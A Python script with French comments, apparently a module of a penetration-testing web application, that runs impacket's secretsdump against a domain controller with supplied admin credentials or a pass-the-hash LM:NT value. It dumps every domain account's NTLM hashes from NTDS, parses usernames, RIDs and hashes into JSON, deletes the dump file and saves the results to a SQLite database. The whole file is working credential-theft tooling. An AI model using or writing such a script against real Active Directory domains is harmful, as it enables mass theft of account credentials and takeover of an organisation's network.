#importer les bibliothèques
import subprocess
import time
import argparse
import json
import sqlite3
from datetime import datetime
import os

#Les arguments :
#remarque : decommenté les arguments
parser = argparse.ArgumentParser()

parser.add_argument('--activity_id', type=str, required=True, help='activity id')
parser.add_argument('--ip_dc', type=str, required=True, help='adresse ip de controlleur de domaine')
parser.add_argument('--domain_name', type=str, required=True, help='le nom FQDN de domaine')
parser.add_argument('--lm_nt_hash', type=str, required=False, help='hash au format LM:NT')
parser.add_argument('--username_admin', type=str, required=True, help='le username dun compte administrateur')
parser.add_argument('--password', type=str, required=False, help='le mot de passe dun compte administrateur')

args = parser.parse_args()

ip_dc = args.ip_dc
domaine_name = args.domain_name
lm_nt_hash = args.lm_nt_hash
username_admin = args.username_admin
password = args.password

# sauvegarde du chemin du repertoire courant
origin_dir_path = os.path.abspath(os.getcwd())

# aller au repertoire dans lequel on stocke les tiquet golden
ntds_directory = "My_app/ntds_dump"
os.chdir(ntds_directory)

#construction de la commande a lancer avec subprocess
if password == '' and lm_nt_hash != '':
	cmd = "python ../scripts/impacket/examples/secretsdump.py -hashes " + lm_nt_hash + " " + domaine_name + "/" + username_admin + "@" + ip_dc + " -just-dc-ntlm -outputfile dump-ntds-rm"
	
	print(cmd)
	
if password != '' and lm_nt_hash == '':
	cmd = "python ../scripts/impacket/examples/secretsdump.py " + domaine_name + "/" + username_admin + ":" + password + "@" + ip_dc + " -just-dc-ntlm -outputfile dump-ntds-rm"
	
	print(cmd)
	

# Exécute la commande dans un nouveau processus
process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE)

# Attend que la tâche soit terminée et récupère la sortie
output, error = process.communicate()
print('%%%%%%%%%%%%%sortie de la commande%%%%%%%%%%%%%')
print(output.decode("utf-8"))
creds = []
resultats = {}
if os.path.isfile("dump-ntds-rm.ntds"):
	print("sucess")
	with open('dump-ntds-rm.ntds', "r") as file:
		content = file.read()
		#print(content)
		
	lines = content.split("\n")
	creds = []
	for line in lines:
		if line != '':
			resultat = {}
			username = line.split(':')[0]
			rid = line.split(':')[1]
			lm_hash = line.split(':')[2]
			nt_hash = line.split(':')[3]
			resultat={
				'username' : username,
				'rid' : rid,
				'lm_hash' : lm_hash,
				'nt_hash' : nt_hash
			
			}
			creds.append(resultat)

	try:
		# Delete the file
		os.remove("dump-ntds-rm.ntds")
		print("File deleted successfully.")
	except OSError as e:
		# Handle file deletion error
		print(f"Error deleting the file: {e}")

os.chdir(origin_dir_path)

resultats["creds"] = creds
resultats["target_ip"] = args.ip_dc
resultats["username_admin"] = args.username_admin


print(json.dumps(resultats, indent=4))




#transformer le dictionnaire en JSON
json_resultats = json.dumps(resultats)


# obtenir l'id de l'activite sur laquel on va enregistrer le resultat :
activity_id = int(args.activity_id)

# Se connecter a la BDD pour enregistrer le resultat sous format json :
conn = sqlite3.connect("db.sqlite3")
c = conn.cursor()

activities = c.execute("update My_app_activity set results = ? where id = ?", (json_resultats, activity_id))
activities = c.execute("update My_app_activity set end_date = ? where id = ?", (datetime.now(), activity_id))

# commit les changements :
conn.commit()
